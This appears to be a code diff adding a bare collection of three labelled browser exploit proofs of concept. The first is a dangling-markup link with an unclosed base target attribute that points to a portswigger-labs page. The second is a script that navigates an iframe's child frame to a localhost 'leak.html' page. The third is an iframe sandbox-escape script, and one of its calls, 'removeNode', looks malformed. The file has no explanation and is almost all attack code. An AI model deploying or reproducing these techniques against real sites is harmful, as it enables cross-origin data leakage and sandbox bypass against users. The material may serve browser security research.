@@ -1,0 +1,45 @@
+Exploit 1:
+<html>
+<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
+</html>
+
+Exploit 2:
+<body>
+    <script>
+      async function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      }
+  
+      (async () => {
+        const iframe = document.createElement("iframe");
+        iframe.src = "http://localhost";
+        document.body.appendChild(iframe);
+  
+        await sleep(1000);
+        // After example.com has loaded and the frame was created, redirect it to our domain
+        iframe.contentWindow.frames[0].location = "http://localhost:3000/leak.html";
+      })();
+    </script>
+  </body>
+
+Exploit 3:
+<script>
+let parent = window.parent;
+if (parent.document.getElementById("escapeMe") != null) {
+
+    // 1. Create replacement iframe
+    let replacement = parent.document.createElement("iframe");
+    replacement.setAttribute("src", "kid.htm");
+    replacement.setAttribute("id", "escapedAlready");
+    parent.document.body.append(replacement);
+
+    // 2. Delete the old one
+    let original = parent.document.getElementById("escapeMe");
+    original.parentNode.removeNode(original);
+
+} else {
+    // When the original iframe no longer exists, we can assume
+    // it is possible to execute our code without restrictions
+    alert("This should not have happened.");
+}
+</script>
